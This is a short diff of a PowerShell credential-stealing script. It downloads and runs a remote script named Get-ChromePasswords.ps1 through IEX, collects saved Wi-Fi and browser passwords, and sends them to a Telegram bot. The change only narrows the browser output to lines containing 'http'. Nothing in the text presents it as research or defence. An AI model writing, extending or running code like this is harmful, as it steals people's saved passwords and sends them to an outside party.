@@ -16,7 +16,7 @@ $Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($Telegramtoken
 $text = Get-Content .\Wi-Fi-PASS -Raw
 Send-Telegram -Message $text
 
-IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/MrAbhinavJindal/NetworkSharing/main/Get-ChromePasswords.ps1')) > Wi-Fi-PASS
+IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/MrAbhinavJindal/NetworkSharing/main/Get-ChromePasswords.ps1'))  | Select-String -Pattern "http" > Wi-Fi-PASS
 $text = Get-Content .\Wi-Fi-PASS -Raw
 Send-Telegram -Message $text
 
